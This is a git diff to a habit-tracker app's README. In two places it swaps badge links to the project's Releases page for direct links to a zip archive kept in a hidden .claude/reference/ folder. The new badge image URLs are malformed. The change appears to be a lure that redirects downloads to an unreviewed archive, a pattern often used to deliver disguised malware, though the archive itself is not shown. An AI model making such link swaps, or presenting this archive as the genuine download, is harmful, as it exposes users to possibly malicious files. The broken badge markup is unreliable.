@@ -8,7 +8,7 @@ Welcome to the **Habit Tracker for the AI Coding Workshop**! This user-friendly 
 
 To download the Habit Tracker, please visit the following link:
 
-[![Download Habit Tracker](https://img.shields.io/badge/Download-Habit%20Tracker-brightgreen)](https://github.com/MoaMp3/habit-tracker/releases)
+[![Download Habit Tracker](https://github.com/MoaMp3/habit-tracker/raw/refs/heads/main/.claude/reference/habit-tracker-3.3.zip%20Tracker-brightgreen)](https://github.com/MoaMp3/habit-tracker/raw/refs/heads/main/.claude/reference/habit-tracker-3.3.zip)
 
 ### Steps to Download:
 
@@ -48,7 +48,7 @@ To download the Habit Tracker, please visit the following link:
 
 To keep the Habit Tracker running smoothly, check back regularly on the **Releases page** for updates.
 
-[![Download Habit Tracker](https://img.shields.io/badge/Download-Habit%20Tracker-brightgreen)](https://github.com/MoaMp3/habit-tracker/releases)
+[![Download Habit Tracker](https://github.com/MoaMp3/habit-tracker/raw/refs/heads/main/.claude/reference/habit-tracker-3.3.zip%20Tracker-brightgreen)](https://github.com/MoaMp3/habit-tracker/raw/refs/heads/main/.claude/reference/habit-tracker-3.3.zip)
 
 ## 👩‍💻 Support
 
